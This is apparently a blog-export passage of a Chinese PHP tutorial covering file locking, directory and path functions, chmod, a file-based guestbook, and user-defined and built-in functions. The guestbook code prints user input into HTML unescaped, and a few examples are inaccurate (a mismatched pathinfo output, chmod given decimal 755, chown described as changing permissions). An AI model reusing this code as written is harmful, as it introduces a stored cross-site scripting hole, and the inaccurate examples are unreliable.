\"锁失败，可能有人在操作，这个时候不能将文件上锁\";\n}\n\nfclose($fp);\n\n?>\n\n\n说明：\n\n上例中我为了写入文件，把文件加上了独占锁。\n如果我操作完成，写入完成后，解除掉了独占锁。\n\n\n&emsp;&emsp;\n八. 目录(文件夹)处理函数\n处理文件夹的基本思想如下：\n\n读取某个路径的时候判断是否是文件夹\n是文件夹的话，打开指定文件夹，返回文件目录的资源变量\n使用readdir读取一次目录中的文件，目录指针向后偏移一次\n使用readdir读取到最后，没有可读的文件返回false\n关闭文件目录\n\n\n&emsp;常用函数：\n\n\n\n函数名\n功能\n\n\n\n\nopendir()\n打开文件夹，返回操作资源 &emsp;[PHP opendir() 函数]\n\n\nreaddir()\n读取文件夹资源,返回目录中下一个文件的文件名。 &emsp;[PHP readdir() 函数]\n\n\nis_dir()\n判断是否是文件夹  &emsp;[PHP is_dir() 函数]\n\n\nclosedir()\n关闭文件夹操作资源  &emsp;[PHP is_dir() 函数]\n\n\nfiletype()\n显示是文件夹还是文件，文件显示file，文件夹显示dir 可能的类型：（fifo、char、dir、block、link、file、unknown）&emsp;[PHP is_dir() 函数]\n\n\n\n&emsp;&emsp;\n九. 文件权限设置\n文件权限设置的函数在系统管理级别的软件中很常用。例如：某个文件不准许guest组（来宾用户）查看。\n\n在企业管理中，某些用户或者某些用户文件只准读取不准修改。这都是非常常用的功能。\n\n注：windows下面有些功能无法实现。\n\n\n\n\n\n函数名\n功能\n\n\n\n\nchmod\n修改读取模式\n\n\nchgrp\n修改用户组\n\n\nchown\n修改权限\n\n\n\n\n上面的函数用法与linux的权限操作的用法一样。\n\n&emsp;chmod 主要是修改文件的的权限\n&lt;?php\n//修改linux  系统/var/wwwroot/某文件权限为755\nchmod(\"/var/wwwroot/index.html\", 755);  \nchmod(\"/var/wwwroot/index.html\", \"u+rwx,go+rx\"); \nchmod(\"/somedir/somefile\", 0755); \n?>\n\n&emsp;&emsp;\n十. 文件路径函数\n我们经常会遇到处理文件路径的情况。\n\n文件后缀需要取出来\n路径需要取出名字不取目录\n只需要取出路径名中的目录路径\n或者把网址中的各个部份进行解析取得独立值\n甚至是自己组成一个url出来……\n\n\n&emsp;常用路径处理函数：\n\n\n\n函数名\n功能\n\n\n\n\npathinfo()\n返回文件的各个组成部份\n\n\nbasename()\n返回文件名\n\n\ndirname()\n文件目录部份\n\n\nparse_url()\n网址拆解成各部份\n\n\nhttp_build_query()\n生成url 中的query字符串\n\n\nhttp_build_url()\n生成一个url\n\n\n\n&emsp;\n10.1 pathinfo()函数\n功能：以关联数组的形式返回文件路径的信息\n\npathinfo(path,options)\n\n\n\n\n参数\n描述\n\n\n\n\npath\n必需。规定要检查的路径。&emsp;[PHP pathinfo() 函数]\n\n\nprocess_sections\n可选。规定要返回的数组元素。默认是 all。可能的值：PATHINFO_DIRNAME - 只返回 dirnamePATHINFO_BASENAME - 只返回 basenamePATHINFO_EXTENSION - 只返回 extension\n\n\n\n&lt;?php\n$path_parts = pathinfo('d:/www/index.inc.php');\n\necho '文件目录名：'.$path_parts['dirname'].\"&lt;br />\";\necho '文件全名：'.$path_parts['basename'].\"&lt;br />\";\necho '文件扩展名：'.$path_parts['extension'].\"&lt;br />\";\necho '不包含扩展的文件名：'.$path_parts['filename'].\"&lt;br />\"; \n?>\n\n结果如下：\n文件目录名：d:/www\n文件全名：lib.inc.php\n文件扩展名：php\n不包含扩展的文件名：lib.inc\n\n&emsp;\n10.2 basename()函数\n功能：返回路径中不带有文件扩展名的文件名\n\nbasename(path[,suffix])\n\n\n\n\n参数\n描述\n\n\n\n\npath\n必需。规定要检查的路径。&emsp;[PHP basename() 函数]\n\n\nsuffix\n可选。指定文件名到了指定字符停止。\n\n\n\n&lt;?php \n\necho \"1: \".basename(\"d:/www/index.d\", \".d\").PHP_EOL;\necho \"2: \".basename(\"d:/www/index.php\").PHP_EOL;\necho \"3: \".basename(\"d:/www/passwd\").PHP_EOL;\n\n?>\n\n执行结果如下\n1: index\n2: index.php\n3: passwd\n\n&emsp;\n10.3 dirname()函数\n功能：返回文件路径的文件目录部份,不包含文件名。\n\ndirname(path)\n\n\n\n\n参数\n描述\n\n\n\n\npath\n必需。规定要检查的路径。&emsp;[PHP dirname() 函数]\n\n\n\n&lt;?php \necho dirname(__FILE__); \n?>\n\n执行结果如下\nG:\\WAMP\\www\n\n&emsp;\n10.4 parse_url()函数\n功能：将网址拆解成各个部份，返回一个数组\n\nmixed parse_url ( string $路径 )\n\n\n&lt;?php\n$url = 'http://username:password@hostname:9090/path?arg=value#anchor';\n\nvar_dump(parse_url($url));\n\n?>\n\n结果如下：\narray(8) {\n[\"scheme\"]=> string(4) \"http\"\n[\"host\"]=> string(8) \"hostname\"\n[\"port\"]=> int(9090)\n[\"user\"]=> string(8) \"username\"\n[\"pass\"]=> string(8) \"password\"\n[\"path\"]=> string(5) \"/path\"\n[\"query\"]=> string(9) \"arg=value\"\n[\"fragment\"]=> string(6) \"anchor\"\n}\n\n&emsp;\n10.5 http_build_query()函数\n功能：生成url 中的query字符串\n\nstring http_build_query ( mixed $需要处理的数据)\n\n&lt;?php\n//定义一个关联数组\n$data = [\n       'username'=>'php',\n       'area'=>'hubei'\n        ];\n\n//生成query内容\necho http_build_query($data);\n?>\n\n结果如下：\nusername=php&amp;area=hubei\n\n\n注：PHP_EOL 常量在 windows平台相当于 echo “\\r\\n”;在unix\\linux平台相当于 echo “\\n”;在mac平台相当于 echo “\\r”;\n\n&emsp;&emsp;\n十一. 文件系统实例案例11.1 文件留言本先来说两个下面用到的两个字符串函数和一个数组函数：\n[trim()函数]：移除字符串两侧的空白字符或其他预定义字符。[explode()函数]：把字符串打散为数组。[each()函数]：返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。\n\n&emsp;\n[视频教程]\n\n\n1. 文件结构：index.php —展示输入框和留言内容,并将内容提交到write.php；write.php —接收并处理来自index.php的内容，然后向message.txt写入数据；message.txt —接收并存入来自write.php的聊天内容。\n\nindex.php文件：\n\n\n&lt;?Php\n//设置时区\ndate_default_timezone_set('PRC');\n//读了内容\n@$string = file_get_contents('message.txt');\n//如果$string 不为空的时候执行，也就是message.txt中有留言数据\nif (!empty($string)) {\n    //每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉\n    $string = rtrim($string, '&amp;^');\n    //以&amp;^切成数组\n    $arr = explode('&amp;^', $string);\n    //将留言内容读取\n    foreach ($arr as $value) {\n        //将用户名和内容分开\n        list($username, $content, $time) = explode('$#', $value);\n        echo '用户名为&lt;font color=\"gree\">' . $username . '&lt;/font>内容为&lt;font color=\"red\">' . $content . '&lt;/font>时间为' . date('Y-m-d H:i:s', $time);\n        echo '&lt;hr />';\n    }\n}\n?>\n&lt;h1>基于文件的留言本演示&lt;/h1>\n&lt;form action=\"write.php\" method=\"post\">\n    用户名：&lt;input type=\"text\" name=\"username\" />&lt;br />\n    留言内容：&lt;textarea  name=\"content\">&lt;/textarea>&lt;br />\n    &lt;input type=\"submit\" value=\"提交\" />\n&lt;/form>\n\n&emsp;write.php文件：\n\n\n&lt;?php\n//追加方式打开文件\n$fp=fopen('message.txt','a');\n\n//设置时间\n$time=time();\n\n//得到用户名\n$username=trim($_POST['username']);\n//得到内容\n$content=trim($_POST['content']);\n\n\n//组合写入的字符串：内容和用户之间分开，使用$#\n//行与行之间分开，使用&amp;^\n$string=$username.'$#'.$content.'$#'.$time.'&amp;^';\n\n//写入文件\nfwrite($fp,$string);\n\n//关闭文件\nfclose($fp);\n\n\nheader('location:index.php');\n\n?>\n\n&emsp;\n步骤1：在www目录下的index.php里面复制上面相对应的内容、新建一个write.php文件并复制相应的内容、新建一个message.txt空文件；\n步骤2：运行index.php如下：\n\n&emsp;\n步骤3：向留言框输入文字并点击提交\n&emsp;\n11.2 修改配置文件[视频教程]&emsp;\n","thumbnail":"https://i.loli.net/2019/02/20/5c6ce86435b96.jpg","plink":"https://Directoree.github.io/post/PHP-FileSystem/"},{"title":"PHP-函数","date":"2019-02-15T12:25:45.000Z","updated":"2019-02-26T08:22:37.627Z","content":"PHP函数分为自定义函数和系统函数 (oﾟvﾟ)ノ\n\n&ensp;&ensp;\nPHP 函数\n\n&emsp;&emsp;\n&emsp;&emsp;\n一. 自定义函数1.1 自定义函数函数基本概念我们在实际开发过程当中需要有很多功能都需要反复使用到，而这些反复需要使用到的功能，我们能定义成功能（函数），就尽可能定义成功能（函数）。使用的时候，吼一下它的名字即可。  那我们来学一下自定义函数的语法规定，语法规定如下：  function 函数名([参数名1[=值1], 参数名2[=值2], 参数名n[=值n]]){       函数中的功能体    [return 返回值]}\n\n上面的语法规定中发现了如下特点，产生如下语未能规定：1. 函数以function开始2. function后面接空格，空格后接函数名3. 函数名与变量命名规则基本一样，但是不同的是：函数名不区分大小写4. 所谓参数其实就是变量5. 函数名后接括号，括号内跟参数，参数全都有[]（中括号）括起来了，代表参数可填可不填6. 如果有参数的话，参数后可以接(＝)等号，等号接默认值。参数值也是用括起来的，代表选填7. 函数后的参数变量，主要功能是把函数体外的变量值，传入函数体内来使用，函数体的变量和函数体外的   变量通常是两个不同的变量。8. 函数中的具体功能（功能体）用大括号括起来，代表这是一个函数的功能区间9. 函数可以有返回值也可以没有返回值，用[]（中括号）括起来的，代表选填。10. return后接空格，空格后接返回值，若有return,return后的代码均不执行。(return可用可不用)11. 函数的执行没有顺序关系，可以在定义处之前的位置调用12. 函数不能被定义两次，即函数不能被重载\n\n&emsp;\n\n1. 函数是条狗，哪里调用哪里哪，它就跟着你走2. 函数名只能是字母，数字，下划线的组合，并且之间不能包含空格，数字不能放在变量名首位。3. 函数名与变量命名规则一样，但是不同的是：函数名不区分大小写 4. 函数体的参数若是定义了，未传参数，代码会报错5. 函数的参数如果有默认值，参数可以不填，代码也不会报错6. 函数的参数可以写多个7. 函数如果有默认值和无默认值的参数，通常把无默认值的参数写在最前面8. 函数体的变量与函数体外的变量没有关系9. 函数体中若有return,return 后的代码不执行10. 函数执行完后,return 可把函数体内的值，带带函数体外11. 函数的执行没有顺序关系，可以在定义处之前的位置调用12. 函数不能重载\n\n&emsp;&emsp;\n1.2 回调函数一个函数作为另外一个函数的参数。\n回调函数，可以配合匿名函数和变量函数实现更加优美、复杂的一种函数结构。回调函数，就是在处理一个功能的时候，我让让这个功能自定义能力再强一些，我准许调用这个函数的时候，还可以传入一个函数配合、协助进行处理。\n\n&lt;?php\nfunction woziji($one,$two,$func){\n       //我规定：检查$func是否是函数，如果不是函数停止执行本段代码，返回false\n       if(!is_callable($func)){\n               return false;\n       }\n\n       //我把$one、$two相加，再把$one和$two传入$func这个函数中处理一次\n       //$func是一个变量函数，参见变量函数这一章\n       echo $one + $two + $func($one,$two);\n\n}\n\n//我们定义几个函数试试\nfunction plusx2( $foo , $bar){\n       $result = ($foo+$bar)*2;\n       return $result;\n}\n\nfunction jian( $x , $y ){\n   $result = $x - $y;\n   return $result;\n}\n//调用一下函数，woziji，向里面传入参数试试\necho woziji(20,10,'plusx2');\n\n//将plusx2改成jian试试结果\necho woziji(20,10,'jian');\n?>\n\n\n处理过程是这样的:    1.将20赋值给形参$one,10赋值给了$two，而plusx2或者jian这两个变量函数，赋值给了$func    2.在woziji这个函数中判断plusx2或者jian是否为函数，不是函数就return false 停止执行了    3.显示plusx2或者jian是函数。因此$one = 20, $two =10相加了，相加后，$one和$two又带入到了了$func($one,$two)中。    4.带入至里面后而$func，是可变的，可以为plusx2或者jian。如果为plusx2的话，$one = 20,$two = 10 的这个两个结果又给        了plusx2函数里面的$foo和$bar    5.$foo + $bar 乘以2后将结果返回至woziji这个函数功能体的运算处：$one + $two + $func($one,$two);    6.这样得到了运算结果现在我们明白了回调函数：在一个调数里面，再传入一个函数名，将函数名加上()括号。识为变量函数，配合执行。\n\n&emsp;&emsp;\n1.3 变量函数function demo(){}$fu = ‘demo’;$fu();\n\n&emsp;\n在之前的变量部份，我们学习了可变变量。可变函数仅仅是可变变量的一个变种、变形表达。可变函数，我们也会称呼为变量函数。简单回顾一下之前的知识点：\n\n&lt;?php \n$hello = 'world';\n$world = '你好';\n//输出的结果为：你好\necho $$hello; \n?>\n\n\n因为$hello先被解释成了world，再world前加上$符就输出了：你好。\n\n&emsp;而变量函数的用法是这样的：\n&lt;?php\nfunction demo(){\n    echo '天王盖地虎';\n}\nfunction test(){\n    echo '小鸡炖蘑菇';\n}\n$fu = 'demo';\n//把$fu变为了demo,把demo后加上了一个括号，就执行函数了\n$fu();\n//把$fu的值改为test字符串再试试？\n?>\n\n&emsp;&emsp;\n1.4 匿名函数匿名函数，也就是没有函数名的函数。\n匿名函数的第一种用法，直接把赋数赋值给变量，调用变量即为调用函数。匿名函数的写法比较灵活。\n1.变量函数式的匿名函数\n\n&lt;?php\n$greet = function($name)\n{\n echo $name.'，你好';\n};\n$greet('明天');\n$greet('PHP中文网');\n?>\n\n\n上例中的函数体没有函数名，通过$greent加上括号来调用的，这就是匿名函数。\n\n&emsp;\n2.回调式的匿名函数实际使用场景中，我们要通过一个函数实现更多的功能。但是，我又不想专门定义一个函数。我们回顾一下，我们回调函数的例子：\n\n&lt;?php\nfunction woziji($one,$two,$func){\n       //我规定：检查$func是否是函数，如果不是函数停止执行本段代码，返回false\n       if(!is_callable($func)){\n               return false;\n       }\n       //我把$one、$two相加，再把$one和$two传入$func这个函数中处理一次\n       //$func是一个变量函数，参见变量函数这一章\n       echo $one + $two + $func($one,$two);\n}\nwoziji(20,30,function( $foo , $bar){\n               $result = ($foo+$bar)*2;\n               return $result;\n           }\n);\n?>\n\n&emsp;仔细推理一下过程哟。只不过在之前的章节当中，plusx2换成了我们的匿名函数：\n&lt;?php\n\nfunction( $foo , $bar){\n\n       $result = ($foo+$bar)*2;\n\n       return $result;\n\n}\n?>\n\n\n因此，函名函数在调用的时候没有函数名。我们可以采用以上的一些方法来使用匿名函数。\n\n&emsp;&emsp;\n1.5 内部函数内部函数，是指在函数内部又声明了一个函数。\n注意事项：1. 内部函数名，不能是已存在的函数名2. 假设在函数a里面定义了一个内部函数，不能定用两次函数a。\n\n我们下面来看代码，你将很快的学习会：\n&lt;?php\nfunction foo()\n{\n   echo '我是函数foo哟，调一下我才会执行定义函数bar的过程&lt;br />';\n function bar()\n {\n      echo '在foo函数内部有个函数叫bar函数&lt;br />';\n }\n}\n\n//现在还不能调用bar()函数，因为它还不存在\n//bar(); //如果现在调用会报错\nfoo();\n\n//现在可以调用bar()函数了，因为foo()函数的执行使得bar()函数变为已定义的函数\nbar();\n//再调一次foo()看看是不是会报错？  会报错\nfoo();\n?>\n\n\n仔细观察和实验后你会得出如下的结论：   1.foo()调用两次会报错   2.如果不调foo()函数无法执行bar函数，因为bar是在foo的内部\n\n&emsp;&emsp;\n1.6 参数的引用在变量这个函数中，我们学习了变量的引用，我们来回顾一下知识：\n&lt;?php\n\n$a = 10;\n\n$b = &amp;$a;\n\n$a = 100;\n\necho $a.'---------'.$b;\n?>\n\n\n上述知识点的在变量章节中，变量引用有讲述，是指变量$a和$b指向到了同一个存储位置，来存值。\n\n&emsp;\n而函数的参数引用，也是这个意思，将形参和实参指向到同一个位置。如果形参在函数体内发生变化，那么实参的值也发生变化。我们来通过实验来看看：\n\n&lt;?php\n\n$foo = 100;\n\n//注意：在$n前面加上了&amp;符\nfunction demo(&amp;$n){\n\n       $n = 10;\n\n       return $n + $n;\n\n}\n\necho  demo($foo).'&lt;br />';\n\n//你会发生$foo的值变为了10\necho $foo;\n?>\n\n\n通过上例，我们发现实参为$foo，在调用demo的时候，让$foo和$n指向到了同一个存储区域，当$n的值发生变化的时候。那么$foo的值也发生变化。\n\n&emsp;&emsp;\n1.7 递归函数递归函数，递归只是一个名字，而递归函数的规定：函数体内调用函数自己。递归在实际工作中主要是用在：文件和文件夹操作的时候有使用到。\n几个思维上的盲区：  1.代码是从上到下执行的，所有代码没有exit等停止符，函数必须执行完。  2.如果函数从函数A跳至函数B后，必须把函数B执行完成再执行函数A余下的代码。  3.递归函数必须要能执行完有结束条件，不然函数就会限入死循环。函数会永远的自我执行下去。\n\n我们来写一代码码来理解一下：\n&lt;?php\n$num = 10;\n//调用一次函数A();\nA($num);\n\nfunction A( $arg ){\n   echo $arg;\n   //在函数A里面去，跑去执行函数B去了\n   B($arg);\n   echo '我们需要不断的努力，努力到上天都为我们感动';\n   echo $arg.'&lt;br />';\n}\nfunction B( $number ){\n       echo $number;\n       echo '俺是狗蛋，执行完了&lt;br />';\n}\n?>\n\n\n结论：1.执行函数A到一半的时候，跑去执行了函数B2.执行完函数B，先显示出来的是：“俺是狗蛋，执行完了”，接着显示的才是：“我们需要不断的努力，努力到上天都为我们感动”3.也就是证明了我们所说思维盲区里面的内容，代码从上到下执行，代码必须执行完。\n\n&emsp;  我们来写一个简单的递归代码,让函数自己调用自己。\n&lt;?php\n$n = 2;\nfunction dg( $n ){\n   echo $n.'&lt;br />';\n   $n = $n - 1;\n   if($n > 0){\n       //在函数体内调用了dg自己哟\n       dg($n);\n   }else{\n       echo '--------------';\n   }\n   echo '俺是狗蛋，俺还没执行' . $n . '&lt;br />';\n}\n?>\n\n\n我们来仔细推理一次：   1.第一次调用dg()，将数字$n = 2传到dg中，先显示出来了2   2.然后将$n - 1 $n的值为了1   3.接着判断$n 是否大于0,肯定是大于0的，所以调用递归自己，再把自己执行一次。   4.而第二次在执行自己dg()的时候，而最下面的 echo ‘俺是狗蛋，俺还没执行’ . $n . ‘‘; 还没有执行到。等待执行完成后再来执行   5.$n此时等于1 ，所以显示出来1。   6.$n把自己减了一次，$n的结果为0   7.$n大于0肯定不成立的，所以显示了一条:”————–”   8.而这个时候该执行：echo ‘俺是狗蛋，俺还没执行’ . $n . ‘‘;   9.第二次执行dg()执行完成。第一次dg()的代码还没执行完，将第4点中的余下代码执行完。\n\n&emsp;&emsp;\n1.8 静态变量静态变量的特点是：声明一个静态变量，第二次调用函数的时候，静态变量不会再初始化变量，会在原值的基础上读取执行。实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量\n\n以下讲述局部静态变量和全局静态变量：\n\n&lt;?php\n//--------------如何理解static静态变量-----------\n\n/** 普通局部变量 */\nfunction local() {\n $loc = 0; //这样，如果直接不给初值0是错误的。\n ++$loc;\n echo $loc . '&lt;br>';\n}\nlocal(); //1\nlocal(); //1\nlocal(); //1\necho '===================================&lt;br/>';\n\n/** static静态局部变量 */\nfunction static_local() {\n static $local = 0 ; //此处可以不赋0值\n $local++;\n echo $local . '&lt;br>';\n}\nstatic_local(); //1\nstatic_local(); //2\nstatic_local(); //3\n//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。\necho '=======================================&lt;br>';\n\n/** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */\nfunction static_global() {\n global $glo; //此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，\n //但是不能想当然的写上\"static\"加以修饰，那样是错误的.\n $glo++;\n echo $glo . '&lt;br>';\n}\nstatic_global(); //1\nstatic_global(); //2\nstatic_global(); //3\n?>\n\n&emsp;&emsp;&emsp;&emsp;\n二. 系统函数2.1 使用介绍[PHP手册下载]1. 如果代码能赚钱，帮你赚钱最多的是基本语法2. 如果你还在当程序员，你看手册的时间可能比你看老婆的时间还长使用函数的重点是三块：    1.了解函数的功能，特别是常用函数的功能    2.了解函数的参数    3.了解函数的返回值\n\n\n我们针对上面的三块，讲解6个函数，这6个函数，概况了函数的基本用法的全部注意事项：\n1. 直接返回布尔型，如bool copy ()2. 带有MIXED参数的函数如何调用。Mixed表示任何类型的数据。如Array_unshift()3. 参数中带有&amp;符的参数，一定要传一个变量做为参数。函数里面改变了他的值。4. 带有[]的参数，表示可选项。5. 带有…的参数，表示可以传任意多个参数。6. 带有callback的参数，表示回调函数。需要传一个函数进来。Array_map()7. 函数支持的版本要了解。\n\n&emsp;\n1. 直接返回布尔型bool copy ( string $source , string $dest [, resource $context ] )\n\n\n这个函数的功能为： 拷备一个文件返回值为为： bool型值，就是成功返回true，失败返回false参数为： 两个字符串的值，一个是copy的源文件，一个为目标文件。第三个参数可选的，不常用，我们不管它。\n\n&lt;?php\n\nif(copy('abc.txt','bcd.txt')){\n   echo '复制成功';\n}else{\n   echo '复制失败';\n}\n?>\n\n&emsp;\n2. Mixed表示任何类型的数据。如Array_unshift() int array_unshift ( array &amp;$array , mixed  $value1 [, mixed $… ] )\n\n\n功能： 操作一个数组，向数组中之前插入其他类型的参数。返回值： int 类型，可能就是插入成功最后的个数参数： 第一个参数为&amp;符，也就是在操作的过程中，改变了第一个参数的值。引用传参。也就是操作这个数组，向这个数组中传入参数。会直接改变这个数组的值。第二个参数为mixed，因为数组可以存入多个不同的类型.mixed是指混合的意思。因此，mixed是指可传入任意类型第三个数数加了中括号[ ]，我们所有遇到中括号的。都是指后面的参数可传，也可以不传。第四，最后还看到了三个…(省略号)。代表可以传入任意多个参数。\n\n&lt;?php\n$queue = array(\"凤姐\", \"芙蓉\");\narray_unshift($queue, \"杨幂\", \"姚晨\");\nprint_r($queue);\n?>\n\n运行结果：\nArray ( [0] => 杨幂 [1] => 姚晨 [2] => 凤姐 [3] => 芙蓉 )\n\n&emsp;\n3. 遇到callback的传函数或者匿名函数进去协助处理，让功能更强大。bool array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )\n\n\n功能：传入一个回调函数，将数组的原来的组操作，并且发生变化。返回值：bool 值 也就是意味着，提示成功或者失败参数：第一个参数是要操作的数组。第二个参数是callback 代表着可以传入函数或者匿名函数。\n\n&lt;?php\n$shuaige = array(\"a\" => \"wuyanzhu\", \"b\" => \"huangxiaoming\", \"c\" => \"ninzetao\");\n\nfunction test_print($item2, $key)\n{\n   echo $key .\" ---\". strtoupper($item2) . \"&lt;br />\\n\";\n}\n\necho '&lt;pre>';\nvar_dump($shuaige);\necho '&lt;/pre>';\n\n\narray_walk($shuaige, 'test_print');\n\necho '用自定义函数test_print执行后的效果：';\n\necho '&lt;pre>';\nvar_dump($shuaige);\necho '&lt;/pre>';\n?>\n\n运行结果：\narray(3) {\n  [\"a\"]=>\n  string(8) \"wuyanzhu\"\n  [\"b\"]=>\n  string(13) \"huangxiaoming\"\n  [\"c\"]=>\n  string(8) \"ninzetao\"\n}\na ---WUYANZHU\nb ---HUANGXIAOMING\nc ---NINZETAO\n用自定义函数test_print执行后的效果：\narray(3) {\n  [\"a\"]=>\n  string(8) \"wuyanzhu\"\n  [\"b\"]=>\n  string(13) \"huangxiaoming\"\n  [\"c\"]=>\n  string(8) \"ninzetao\"\n}\n\n\n通过上例，我们发现数组中的每个参数和值都被修改了。上例大家只需要理解看见传callback的，需要传入函数协助处理就可以。不用理解。我们在下一章的数组部份，学习完数组，大家可以再看看。函数支持的版本号很重要。\n\n&emsp;&emsp;\n2.2 文件包含函数在实际开发中，常常需要把程序中的公用代码放到一个文件中，使用这些代码的文件只需要包含这个文件即可。这种方法有助于提高代码的重用性，给代码的编写与维护带来很大的便利。在PHP中， 有includeinclude_oncerequirerequire_once四种方法包含一个文件。\n\n\n\n\n函数\n包含失败\n特点\n\n\n\n\nInlcude\n返回一条警告\n文件继续向下执行。通常用于动态包含\n\n\nRequire\n一个致命的错\n代码就不会继续向下执行。通常包含极为重要的文件，整个代码甭想执行\n\n\nInclude_once\n返回一条警告\n除了原有include的功能以外，它还会做once检测，如果文件曾经已经被被包含过，不再包含\n\n\nRequire_once\n一个致命的错\n除了原的功能一外，会做一次once\n\n\n\n&emsp;\n注意：1，少用_once带once，因为它会消耗更多的资源去做检测的工作。2，特高级Include文件只需要编译一次，因为每次包含include都会再执行一次对应的代码，如何减少include再次执行时，需要重新解析的过程。\n\n&emsp;\n1. include包含函数的功能。创建一个functions.php文件，里面写上两个函数：(1)↓↓\n\n&lt;?php\n//functions.php文件\n\nfunction demo(){\n   echo 'aaaa';\n}\n\nfunction test(){\n   echo 'cccdddd';\n}\n?>\n\n&emsp;在functions.php的同级目录下，我再创建一个user.php文件把functions.php文件包含进来。这样我的函数就可以专门放在functions.php里面，哪儿需要用到这些函数的时候，我就从哪儿包含进来：\n&lt;?php\n\n//user.php\n\ninclude 'functions.php';\n\n//可以直接调用\ndemo();\n\ntest();\n?>\n\n&emsp;接下来我们对比include和require：(2)↓↓代码中，我们先用include来包含不存在的test.php文件，\n&lt;?php\n\n//user.php\n\ninclude 'functions.php';\ninclude 'test.php';\n\n//可以直接调用\ndemo();\n\ntest();\n?>\n\n再用require包含 不存在的test.php文件：\n&lt;?php\n\n//user.php\n\ninclude 'functions.php';\nrequire 'test.php';\n\n//可以直接调用\ndemo();\n\ntest();\n?>\n\n\n通过上例的对比我们发现：(1) 如果test.php文件不存在include 会发出警告继续执行demo()和test()函数。(2) 而requre则直接报错，demo()和test()函数无法继续执行。\n\n&emsp;我们通过表格知道了:inlcude 和include_once的区别在于，检测是否重复包含。如果重复包含了include_once不会再包含 对应的文件了，而include 则不管这些。有没引入过文件，都再引入一次。include使用两次会报错，而include_once不会报错！\n同样刚刚的user.php我们再实验一下,我们将functions.php包含两次，分别使用include和include_once：(3)↓↓\n&lt;?php\n\n//user.php\n\n//这儿被包含了两次同样的函数定义文件哟\ninclude 'functions.php';\ninclude 'functions.php';\n\n//可以直接调用\ndemo();\n\ntest();\n?>\n\n运行后系统会报错！！！\n\n改为include_once再试一次：\n&lt;?php\n//user.php\n\n//这儿被包含了两次同样的函数定义文件哟\ninclude_once 'functions.php';\ninclude_once 'functions.php';\n\n//可以直接调用\ndemo();\n\ntest();\n?>\n\n运行后系统不会报错！！！\n\n\n结论：我们在函数定义章节讲过，函数不能定义两次，否则会报错。使用include时，因为我们将 functions.php包含了两次所以执行了两次，因此报这个错误。而include_once不报错的原因是因为：他检测了functions.php曾经包含过，不再进行包含引入了。\n\n而require和require_once的功能，大家用你最最聪明的小脑袋是不是就能推理出来了呢？require_once有两个特点：1. 包含的文件必须存在，否则停止执行2. 会做重复包含检查哟\n\n\n&emsp;&emsp;\n2.3  数学常用函数在PHP程序中常常需要进行数据处理运算，这就需要使用数学函数。数学函数是最简单、最常用的系统函数。本章以数学函数为例讲解系统函数的调用方法。\n只需要记最常用的一些即可，最常用的列表：\n\n\n\n函数名\n描述\n实例\n输入\n输出\n\n\n\n\nabs()\n求绝对值\n$abs = abs(-4.2); //4.2\n数字\n绝对值数字\n\n\nceil()\n进一法取整\necho ceil(9.999); // 10\n浮点数\n进一取整\n\n\nfloor()\n舍去法取整\necho floor(9.999); // 9\n浮点数\n直接舍去小数部分\n\n\nfmod()\n浮点数取余\n“$x = 5.7;$y = 1.3;$r = fmod($x, $y);// $r equals 0.5, because 4 *  1.3 + 0.5 = 5.7”\n两个浮点数,x&gt;y\n浮点余数\n\n\npow()\n返回数的n次方\necho pow(-1, 20); // 1\n基础数n次方\n乘方值\n\n\nround()\n浮点数四舍五入\necho round(1.95583, 2);// 1.96\n一个数值\n保留小数点后多少位,默认为0,舍入后的结果\n\n\nsqrt()\n求平方根\necho sqrt(9); //3\n被开方的数\n平方根\n\n\nmax()\n求最大值\n“echo max(1, 3, 5, 6, 7);  // 7 echo max(array(2, 4, 5)); // 5”\n多个数字或数组\n返回其中的最大值\n\n\nmin()\n求最小值\nmin\n多个数字或数组\n返回其中的最小值\n\n\nmt_rand()\n更好的随机数\necho mt_rand(0,9);//n\n最小/最大,随机数\n随机返回范围内的值\n\n\nrand()\n随机数\necho rand()\n最小/最大,随机数\n随机返回范围内的值\n\n\npi()\n获取圆周率值\necho pi(); // 3.1415926535898\n无\n获取圆周率\n\n\n\n&emsp;&emsp;\n2.4  获取时期时间信息函数在正式学习日期函数前大家得了解几个概念：1. 时区2. 世界时3 .unix时间戳\n\n\n时区这个概念，之前大家听说过很多。我们来啰嗦两句，我们现实生活中使用的实区，在电脑里面也是一样有规定的。1884年在华盛顿召开国际经度会议时，为了克服时间上的混乱，规定将全球划分为24个时区。在中国采用首都北京所在地东八区的时间为全国统一使用时间。\n\n\n世界时不光是天文学家使用格林尼治时间（英文简写:GMT），就是在新闻报刊上也经常出现这个名词。我们知道各地都有各地的地方时间。如果对国际上某一重大事情，用地方时间来记录，就会感到复杂不便．而且将来日子一长容易搞错。因此，天文学家就提出一个大家都能接受且又方便的记录方法，那就是以格林尼治（英国某地区）的地方时间为标准。\n\n\nunix时间戳电脑本身不认识时间，我们在电脑里面设置一个时间方便运算。于是我们规定了一种计算方式，unix时间戳。从Unix纪元（1970 年 1月1日零时）开始到一个时间经过的秒数。\n\n&emsp;\n1. 设置时区如果，我们是跨国的多语方程序，我们通常是通过在配置文件里面来写好了个时区，每次程序运行的时候。都会读取这个时区的设置，来显示时间。设置时区的函数为：1). date_default_timezone_get()2). date_default_timezone_set()\n\n&emsp;\n(1)↓↓第一个函数就不重点讲解了，比较简单。用法如下：string date_default_timezone_get ( void )功能如下：取得一个脚本中所有日期时间函数所使用的默认时区示例：\n\n&lt;?php\necho date_default_timezone_get ();\n?>\n\n输出:UTC\n\n&emsp;\n(2)↓↓第二个函数是重点：用法如下：bool date_default_timezone_set ( string $timezone_identifier )功能如下：用于所有日期时间函数的默认时区&emsp;[注：时区列表请详见官方手册]\n\n&lt;?php\n//定义一下时区常量，以后你可以放到配置文件里\ndefine('TIME_ZONE','Asia/shanghai');\n\n//执行函数\ndate_default_timezone_set(TIME_ZONE);\n\necho date('Y-m-d H:i:s');\n?>\n\n输出：2019-02-17 13:03:42\n\n&emsp;\n2. time()获取当前的unix时间戳以下代码输出当前时间的Unix时间戳。\n\n&lt;?php\n   $time=time();\n   print_r( $time);\n?>\n程序运行结果：\n1421597858\n\n&emsp;\n3. “亚麻跌”是PHP学习时间处理的关键Y &emsp;英文是 year， 为年份  